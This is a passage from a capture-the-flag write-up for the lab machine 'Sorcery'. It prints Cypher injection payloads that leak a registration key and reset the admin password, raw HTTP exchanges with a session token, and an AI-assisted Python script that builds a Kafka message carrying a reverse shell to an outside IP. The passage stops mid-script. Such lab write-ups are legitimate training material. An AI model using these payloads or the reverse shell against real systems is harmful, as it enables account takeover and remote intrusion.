Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22dashboard%22%2C%7B%22children%22%3A%5B%22store%22%2C%7B%22children%22%3A%5B%5B%22product%22%2C%2288b6b6c5-a614-486c-9d51-d255f47efb4f%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fdashboard%2Fstore%2F88b6b6c5-a614-486c-9d51-d255f47efb4f%22%2C%22refresh%22%5D%7D%2Cnull%2C%22refetch%22%5D%7D%5D%7D%5D%7D%5D
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://sorcery.htb/dashboard/store
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive


```

```shell
HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Sun, 15 Jun 2025 15:23:04 GMT
Content-Type: text/x-component
Connection: keep-alive
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
X-Powered-By: Next.js
Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
Content-Length: 1408

3:I[9275,[],""]
5:I[1343,[],""]
4:["product","88b6b6c5-a614-486c-9d51-d255f47efb4f","d"]
0:["eMXTkHuLPViqV0QpNTSCV",[["children","dashboard","children","store","children",["product","88b6b6c5-a614-486c-9d51-d255f47efb4f","d"],[["product","88b6b6c5-a614-486c-9d51-d255f47efb4f","d"],{"children":["__PAGE__",{}]}],[["product","88b6b6c5-a614-486c-9d51-d255f47efb4f","d"],{"children":["__PAGE__",{},[["$L1","$L2"],null],null]},["$","$L3",null,{"parallelRouterKey":"children","segmentPath":["children","dashboard","children","store","children","$4","children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"className":"rounded-xl border bg-card text-card-foreground shadow","children":["$","div",null,{"className":"flex flex-col space-y-1.5 p-6","children":["$","h3",null,{"className":"font-semibold tracking-tight text-3xl","children":"Not found (404)"}]}]}],"notFoundStyles":[],"styles":null}],null],[null,[null,"$L6"]]]]]
6:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"Sorcery"}],["$","link","3",{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"16x16"}],["$","meta","4",{"name":"next-size-adjust"}]]
1:null
2:E{"digest":"604999825"}

```

Our skeleton plan was to somehow leak the `Registration Key` from the `Database`, reflected in the `Description` of a product. Then to `register` a `seller`, create a `malicious product` that somehow granted us `admin privileges`.

After quite some hours of painful testing because of either problems with the infrastructure or the box itself (socket timeouts, closed connection, unresponsive web server, cookie cleanup, registering a user over and over again), our AI mate crafted a payload that achieved the first phase of our plan.

```shell
"}) OPTIONAL MATCH (c:Config) RETURN result { .*, description: coalesce(c.registration_key, result.description) }//
```

We needed to `URL encode` all the necessary characters and send it right after the `UUID` of the product we viewed.

```shell
%22%7d%29%20OPTIONAL%20MATCH%20%28c%3aConfig%29%20RETURN%20result%20%7b%20%2e%2a%2c%20description%3a%20coalesce%28c%2eregistration_key%2c%20result%2edescription%29%20%7d%2f%2f
```

```shell
GET /dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7d%29%20OPTIONAL%20MATCH%20%28c%3aConfig%29%20RETURN%20result%20%7b%20%2e%2a%2c%20description%3a%20coalesce%28c%2eregistration_key%2c%20result%2edescription%29%20%7d%2f%2f HTTP/1.1
Host: sorcery.htb
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEzOTkwNjg3LWNlOWMtNGVlOS1iNzBjLTg5MmQwOGNhOTQ5NCIsInVzZXJuYW1lIjoiZm9vYmFyIiwicHJpdmlsZWdlTGV2ZWwiOjAsIndpdGhQYXNza2V5IjpmYWxzZSwib25seUZvclBhdGhzIjpudWxsLCJleHAiOjE3NTAwODcyNDd9.eje_ZoqiAhmfGVLvbCNWPZ9GN3mOHImJsSESppC2i78
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Referer: https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f"})+OPTIONAL+MATCH+(c%3aConfig)+RETURN+result+{+.*,+description%3a+coalesce(c.registration_key,+result.description)+}/


```

We got a lot of data back and something that looked like a `UUID` but since we didn't know what the `Registration Key` would look like, it was also possible that the data exfiltration worked.

```shell
HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Sun, 15 Jun 2025 15:41:01 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
link: </_next/static/media/a34f9d1faa5f3315-s.p.woff2>; rel=preload; as="font"; crossorigin=""; type="font/woff2"
X-Powered-By: Next.js
Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
Content-Length: 16342

<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/bbf23c3485001663.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-28852a6be0d47523.js"/><script src="/_next/static/chunks/fd9d1056-360e5dd5b3902a99.js" async=""></script><script src="/_next/static/chunks/23-1a3a4e90b1d820c2.js" async=""></script><script src="/_next/static/chunks/main-app-6dfa4b35ad3bf648.js" async=""></script><script src="/_next/static/chunks/0e5ce63c-3111fb0608b1162f.js" async=""></script><script src="/_next/static/chunks/967-ebf83667b0b78310.js" async=""></script><script src="/_next/static/chunks/236-32f22b3545922907.js" async=""></script><script src="/_next/static/chunks/app/layout-cd41b72af35bdfcb.js" async=""></script><script src="/_next/static/chunks/231-f7e6000a8dbe3040.js" async=""></script><script src="/_next/static/chunks/330-bb05a33eda29d9e6.js" async=""></script><script src="/_next/static/chunks/app/dashboard/layout-0c5731e2040484c0.js" async=""></script><title>Sorcery</title><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16"/><meta name="next-size-adjust"/><script src="/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js" noModule=""></script></head><body class="min-h-screen bg-background font-sans antialiased __variable_d65c78"><script>!function(){var d=document.documentElement,c=d.classList;c.remove('light','dark');d.style.colorScheme = 'dark';c.add('dark')}()</script><div class="flex"><div class="w-[300px] h-screen flex flex-col fixed"><div class="h-[50px] flex items-center justify-center border-2">foobar<!-- --> (<!-- -->Client<!-- -->)</div><div class="flex-1 flex"><div class="flex-1 flex flex-col border-x-2"><div class="p-2"><a href="/dashboard/store"><button class="inline-flex items-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 shadow h-9 px-4 py-2 w-full hover:bg-primary hover:text-black justify-start bg-primary text-black"><div class="flex gap-2 items-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-store"><path d="m2 7 4.41-4.41A2 2 0 0 1 7.83 2h8.34a2 2 0 0 1 1.42.59L22 7"></path><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path><path d="M15 22v-4a2 2 0 0 0-2-2h-2a2 2 0 0 0-2 2v4"></path><path d="M2 7h20"></path><path d="M22 7v3a2 2 0 0 1-2 2a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 16 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 12 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 8 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 4 12a2 2 0 0 1-2-2V7"></path></svg>Store</div></button></a></div><div class="flex-grow"></div><div class="p-2"><a href="/dashboard/profile"><button class="inline-flex items-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 shadow h-9 px-4 py-2 w-full bg-transparent hover:bg-primary hover:text-black text-white justify-start"><div class="flex gap-2 items-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user-round-pen"><path d="M2 21a8 8 0 0 1 10.821-7.487"></path><path d="M21.378 16.626a1 1 0 0 0-3.004-3.004l-4.01 4.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path><circle cx="10" cy="8" r="5"></circle></svg>Profile</div></button></a></div><div class="p-2"><a href="/auth/logout"><button class="inline-flex items-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 shadow h-9 px-4 py-2 w-full bg-transparent hover:bg-primary hover:text-black text-white justify-start"><div class="flex gap-2 items-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-log-out"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" x2="9" y1="12" y2="12"></line></svg>Logout</div></button></a></div></div></div></div><div class="w-[300px]"></div><div class="flex-1"><div class="h-[50px] flex items-center border-b-2 border-t-2 px-4 w-full fixed bg-background z-10"><nav aria-label="breadcrumb"><ol class="flex flex-wrap items-center gap-1.5 break-words text-sm text-muted-foreground sm:gap-2.5"><li class="inline-flex items-center gap-1.5"><a class="transition-colors hover:text-foreground" href="/dashboard/store">Store</a></li><li role="presentation" aria-hidden="true" class="[&amp;&gt;svg]:size-3.5"><svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.1584 3.13508C6.35985 2.94621 6.67627 2.95642 6.86514 3.15788L10.6151 7.15788C10.7954 7.3502 10.7954 7.64949 10.6151 7.84182L6.86514 11.8418C6.67627 12.0433 6.35985 12.0535 6.1584 11.8646C5.95694 11.6757 5.94673 11.3593 6.1356 11.1579L9.565 7.49985L6.1356 3.84182C5.94673 3.64036 5.95694 3.32394 6.1584 3.13508Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path></svg></li><li class="inline-flex items-center gap-1.5"><a class="transition-colors hover:text-foreground" href="/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7d%29%20OPTIONAL%20MATCH%20%28c%3aConfig%29%20RETURN%20result%20%7b%20%2e%2a%2c%20description%3a%20coalesce%28c%2eregistration_key%2c%20result%2edescription%29%20%7d%2f%2f">88b6b6c5 A614 486c 9d51 D255f47efb4f%22%7d%29%20OPTIONAL%20MATCH%20%28c%3aConfig%29%20RETURN%20result%20%7b%20%2e%2a%2c%20description%3a%20coalesce%28c%2eregistration_key%2c%20result%2edescription%29%20%7d%2f%2f</a></li><li role="presentation" aria-hidden="true" class="[&amp;&gt;svg]:size-3.5"><svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.1584 3.13508C6.35985 2.94621 6.67627 2.95642 6.86514 3.15788L10.6151 7.15788C10.7954 7.3502 10.7954 7.64949 10.6151 7.84182L6.86514 11.8418C6.67627 12.0433 6.35985 12.0535 6.1584 11.8646C5.95694 11.6757 5.94673 11.3593 6.1356 11.1579L9.565 7.49985L6.1356 3.84182C5.94673 3.64036 5.95694 3.32394 6.1584 3.13508Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path></svg></li></ol></nav></div><div class="h-[50px]"></div><div class="p-2 border-r-2"><div class="rounded-xl border bg-card text-card-foreground shadow flex flex-col"><div class="flex flex-col space-y-1.5 p-6"><h3 class="font-semibold leading-none tracking-tight"><p class="text-3xl">Mystic Elixirs</p></h3></div><div class="p-6 pt-0 flex flex-col flex-1"><p class="mb-4 text-xl">dd05d743-b560-45dc-9a09-43ab18c7a513</p></div></div></div></div></div><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><script src="/_next/static/chunks/webpack-28852a6be0d47523.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/a34f9d1faa5f3315-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/bbf23c3485001663.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"3:I[5751,[],\"\"]\n6:I[9275,[],\"\"]\n8:I[1343,[],\"\"]\na:I[3365,[\"310\",\"static/chunks/0e5ce63c-3111fb0608b1162f.js\",\"967\",\"static/chunks/967-ebf83667b0b78310.js\",\"236\",\"static/chunks/236-32f22b3545922907.js\",\"185\",\"static/chunks/app/layout-cd41b72af35bdfcb.js\"],\"default\"]\nb:I[771,[\"310\",\"static/chunks/0e5ce63c-3111fb0608b1162f.js\",\"967\",\"static/chunks/967-ebf83667b0b78310.js\",\"236\",\"static/chunks/236-32f22b3545922907.js\",\"185\",\"static/chunks/app/layout-cd41b72af35bdfcb.js\"],\"Toaster\"]\nd:I[6130,[],\"\"]\n7:[\"product\",\"88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D)%20OPTIONAL%20MATCH%20(c%3AConfig)%20RETURN%20result%20%7B%20.*%2C%20description%3A%20coalesce(c.registration_key%2C%20result.description)%20%7D%2F%2F\",\"d\"]\ne:[]\n"])</script><script>self.__next_f.push([1,"0:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/bbf23c3485001663.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],[\"$\",\"$L3\",null,{\"buildId\":\"eMXTkHuLPViqV0QpNTSCV\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7d%29%20OPTIONAL%20MATCH%20%28c%3aConfig%29%20RETURN%20result%20%7b%20%2e%2a%2c%20description%3a%20coalesce%28c%2eregistration_key%2c%20result%2edescription%29%20%7d%2f%2f\",\"initialTree\":[\"\",{\"children\":[\"dashboard\",{\"children\":[\"store\",{\"children\":[[\"product\",\"88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D)%20OPTIONAL%20MATCH%20(c%3AConfig)%20RETURN%20result%20%7B%20.*%2C%20description%3A%20coalesce(c.registration_key%2C%20result.description)%20%7D%2F%2F\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"dashboard\",{\"children\":[\"store\",{\"children\":[[\"product\",\"88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D)%20OPTIONAL%20MATCH%20(c%3AConfig)%20RETURN%20result%20%7B%20.*%2C%20description%3A%20coalesce(c.registration_key%2C%20result.description)%20%7D%2F%2F\",\"d\"],{\"children\":[\"__PAGE__\",{},[[\"$L4\",\"$L5\"],null],null]},[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"dashboard\",\"children\",\"store\",\"children\",\"$7\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"div\",null,{\"className\":\"rounded-xl border bg-card text-card-foreground shadow\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex flex-col space-y-1.5 p-6\",\"children\":[\"$\",\"h3\",null,{\"className\":\"font-semibold tracking-tight text-3xl\",\"children\":\"Not found (404)\"}]}]}],\"notFoundStyles\":[],\"styles\":null}],null]},[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"dashboard\",\"children\",\"store\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":null}],null]},[\"$L9\",null],null]},[[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"min-h-screen bg-background font-sans antialiased __variable_d65c78\",\"children\":[\"$\",\"$La\",null,{\"children\":[[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[],\"styles\":null}],[\"$\",\"$Lb\",null,{}]]}]}]}],null],null],\"couldBeIntercepted\":false,\"initialHead\":[null,\"$Lc\"],\"globalErrorComponent\":\"$d\",\"missingSlots\":\"$We\"}]]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Sorcery\"}],[\"$\",\"link\",\"3\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"16x16\"}],[\"$\",\"meta\",\"4\",{\"name\":\"next-size-adjust\"}]]\n4:null\n"])</script><script>self.__next_f.push([1,"10:I[2877,[\"310\",\"static/chunks/0e5ce63c-3111fb0608b1162f.js\",\"967\",\"static/chunks/967-ebf83667b0b78310.js\",\"231\",\"static/chunks/231-f7e6000a8dbe3040.js\",\"330\",\"static/chunks/330-bb05a33eda29d9e6.js\",\"663\",\"static/chunks/app/dashboard/layout-0c5731e2040484c0.js\"],\"default\"]\n9:[\"$\",\"div\",null,{\"className\":\"flex\",\"children\":[[\"$\",\"div\",null,{\"className\":\"w-[300px] h-screen flex flex-col fixed\",\"children\":[[\"$\",\"div\",null,{\"className\":\"h-[50px] flex items-center justify-center border-2\",\"children\":[\"foobar\",\" (\",\"Client\",\")\"]}],[\"$\",\"div\",null,{\"className\":\"flex-1 flex\",\"children\":\"$Lf\"}]]}],[\"$\",\"div\",null,{\"className\":\"w-[300px]\"}],[\"$\",\"div\",null,{\"className\":\"flex-1\",\"children\":[[\"$\",\"div\",null,{\"className\":\"h-[50px] flex items-center border-b-2 border-t-2 px-4 w-full fixed bg-background z-10\",\"children\":[\"$\",\"$L10\",null,{}]}],[\"$\",\"div\",null,{\"className\":\"h-[50px]\"}],[\"$\",\"div\",null,{\"className\":\"p-2 border-r-2\",\"children\":[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"dashboard\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":null}]}]]}]]}]\n"])</script><script>self.__next_f.push([1,"11:I[4980,[\"310\",\"static/chunks/0e5ce63c-3111fb0608b1162f.js\",\"967\",\"static/chunks/967-ebf83667b0b78310.js\",\"231\",\"static/chunks/231-f7e6000a8dbe3040.js\",\"330\",\"static/chunks/330-bb05a33eda29d9e6.js\",\"663\",\"static/chunks/app/dashboard/layout-0c5731e2040484c0.js\"],\"default\"]\nf:[\"$\",\"$L11\",null,{\"tabsTop\":[{\"href\":\"/dashboard/store\",\"title\":\"Store\",\"icon\":\"Store\"}],\"tabsBottom\":[{\"href\":\"/dashboard/profile\",\"title\":\"Profile\",\"icon\":\"UserRoundPen\"},{\"href\":\"/auth/logout\",\"title\":\"Logout\",\"icon\":\"LogOut\"}]}]\n"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"className\":\"rounded-xl border bg-card text-card-foreground shadow flex flex-col\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex flex-col space-y-1.5 p-6\",\"children\":[\"$\",\"h3\",null,{\"className\":\"font-semibold leading-none tracking-tight\",\"children\":[\"$\",\"p\",null,{\"className\":\"text-3xl\",\"children\":\"Mystic Elixirs\"}]}]}],[\"$\",\"div\",null,{\"className\":\"p-6 pt-0 flex flex-col flex-1\",\"children\":[\"$\",\"p\",null,{\"className\":\"mb-4 text-xl\",\"dangerouslySetInnerHTML\":{\"__html\":\"dd05d743-b560-45dc-9a09-43ab18c7a513\"}}]}]]}]\n"])</script></body></html>
```

```shell
dd05d743-b560-45dc-9a09-43ab18c7a513
```

![](images/2025-06-15_17-44_443_cipher_injection_registration_key.png)

We used whatever we leaked and tried to register a new seller but also received a `401` from the `backend` which ended our approach at this point.

### Change Admin Password

The second idea was to use the `Cypher Injection` to overwrite the `password` of `admin` to skip the step of being a `seller` and instead go directly to full access on the web application.

From the code review earlier we knew that the `database` used `Argon2`. Therefore we had to forge our own `Argon2 encrypted password` in order to inject it into the database.

We tested a few variations of settings until we found a working combination.

- [https://argon2.online/](https://argon2.online/)
- [https://community.bitwarden.com/t/argon2id-settings-higher-values-better/70073/6](https://community.bitwarden.com/t/argon2id-settings-higher-values-better/70073/6)

![](images/2025-06-15_19-12_argon2_hash_generator.png)

```shell
$argon2id$v=19$m=19456,t=2,p=1$WEZkUmd6aWtrRkpwYzlFUg$JrMJMsADxWS9xWg23AR8IQ
```

Next we modified the payload to `set` the `new password` on `admin` and reflect a message when it was successful.

```shell
"}) WITH result MATCH (u:User {username: 'admin'}) SET u.password = '$argon2id$v=19$m=19456,t=2,p=1$WEZkUmd6aWtrRkpwYzlFUg$JrMJMsADxWS9xWg23AR8IQ' RETURN result { .*, description: 'admin password updated' } //
```

```shell
%22%7d%29%20WITH%20result%20MATCH%20%28u%3aUser%20%7busername%3a%20%27admin%27%7d%29%20SET%20u%2epassword%20%3d%20%27%24argon2id%24v%3d19%24m%3d19456%2ct%3d2%2cp%3d1%24WEZkUmd6aWtrRkpwYzlFUg$JrMJMsADxWS9xWg23AR8IQ%27%20RETURN%20result%20%7b%20%2e%2a%2c%20description%3a%20%27admin%20password%20updated%27%20%7d%20%2f%2f
```

After injecting it the same way we did it before we got the reflected message and could login as `admin` now fully `authenticated` against the `backend` and able to execute code.

![](images/2025-06-15_19-10_443_admin_password_changed.png)

![](images/2025-06-15_19-14_443_admin_dashboard_after_authentication.png)

## Admin Dashboard Enumeration (Authenticated)

Now as authenticated admin user we tested the actual functionality of each of the options.

![](images/2025-06-15_19-14_443_admin_dns.png)

![](images/2025-06-15_19-16_443_admin_new_product.png)

![](images/2025-06-15_19-16_443_admin_new_product_store.png)

### Enroll Passkey

Now that we actually could send changes to the `backend` we were able to `enroll` as `Passkey` as `admin`. This was necessary because some of the features required a `session` as `admin` but authenticated via `Passkey`.

First we configured our `Browser` to use as `Passkey` aka using `WebAuthn`.

1. Developer Tools
2. Burger Symbol
3. More tools
4. WebAuthn

![](images/2025-06-15_19-20_developer_tools_webauthn.png)

![](images/2025-06-15_19-19_443_enroll_passkey.png)

We clicked on `Add` at the bottom of the `WebAuthn` tab in the `Developer Tools` and then on `This device`.

![](images/2025-06-15_19-21_passkey_prompt.png)

![](images/2025-06-15_19-23_443_enrolled_passkey.png)

Then we `logged out` to `login again` but this time with a `Passkey` enrolled and used for `authentication`.

![](images/2025-06-15_19-23_443_admin_login_with_passkey.png)

We tested our new capabilities by fetching the latest `DNS` changes.

![](images/2025-06-15_19-25_443_admin_dns_fetch.png)

## Foothold

### Server-Side Request Forgery (SSRF) into DNS Injection through Kafka Protocol

Now that we skipped the part of the seller, we focused on the `Debug` tab which allowed us to specify a `host` and `port` we wanted to send data too. This could lead to potential `Server-Side Request Forgery (SSRF)`.

We knew from the code in the repository that there was an instance of `Apache Kafka` running on port `9092/TCP` which could eventually lead to `Remote Code Execution (RCE)` through `DNS Injection`.

```yaml
<--- CUT FOR BREVITY --->
  kafka:
    restart: always
    build: kafka
    environment:
      CLUSTER_ID: pXWI6g0JROm4f-1iZ_YH0Q
      KAFKA_NODE_ID: 1
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT
      KAFKA_LISTENERS: PLAINTEXT://kafka:9092,CONTROLLER://kafka:9093
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092
      KAFKA_PROCESS_ROLES: broker,controller
      KAFKA_CONTROLLER_QUORUM_VOTERS: 1@kafka:9093
      KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/kafka/9092"]
      interval: 5s
      timeout: 10s
      retries: 5
<--- CUT FOR BREVITY --->
```

The easiest way we found was to feed the information we had to our AI mate once again and to let him craft a script that would provide us the `hex formatted` payload.

- [https://cwiki.apache.org/confluence/display/KAFKA/A+Guide+To+The+Kafka+Protocol](https://cwiki.apache.org/confluence/display/KAFKA/A+Guide+To+The+Kafka+Protocol)

```python
import struct
import zlib
import binascii

# ================================
# Configurable Section
# ================================
TOPIC_NAME = "update"
REVERSE_SHELL = "bash -c 'sh -i >& /dev/tcp/10.10.16.33/9001 0>&1'"
CORRELATION_ID = 1337
CLIENT_ID = "dbg"

# ================================
# Helper: Build Kafka Message
# ================================
def build_kafka_message(payload: bytes) -> bytes:
    """
    Constructs a Kafka Message:
    [CRC32][MagicByte][Attributes][KeyLength][ValueLength][Value]
    """
    magic_byte = 0
    attributes = 0
    key = -1  # null key

    message_body = struct.pack(">BBi", magic_byte, attributes, key)
    message_body += struct.pack(">i", len(payload)) + payload

    crc32 = zlib.crc32(message_body) & 0xffffffff
    return struct.pack(">I", crc32) + message_body

# ================================
# Kafka Produce Request
# ================================
def build_kafka_produce_request(topic: str, message: bytes) -> bytes:
    topic_bytes = topic.encode()
    message_bytes = build_kafka_message(message)

    # Kafka MessageSet
    message_set = struct.pack(">q", 0)                       # offset
    message_set += struct.pack(">i", len(message_bytes))     # message size
    message_set += message_bytes                             # message

    # Partition data
    partition = 0
    pdata = struct.pack(">i", partition)
    pdata += struct.pack(">i", len(message_set)) + message_set

    # Topic data
    tdata = struct.pack(">h", len(topic_bytes)) + topic_bytes
    tdata += struct.pack(">i", 1) + pdata  # 1 partition

    # Request body
    required_acks = 1
    timeout_ms = 10000
    body = struct.pack(">h", required_acks)
    body += struct.pack(">i", timeout_ms)
    body += struct.pack(">i", 1) + tdata  # 1 topic

    # Kafka Header
    api_key = 0        # Produce
    api_version = 0    # Legacy version
    client_id_bytes = CLIENT_ID.encode()
    hdr = struct.pack(">hhih", api_key, api_version, CORRELATION_ID, len(client_id_bytes))
    hdr += client_id_bytes

    # Final packet: [length][header][body]
    packet = hdr + body
    return struct.pack(">i", len(packet)) + packet

# ================================
# Execution
# ================================
if __name__ == "__main__":
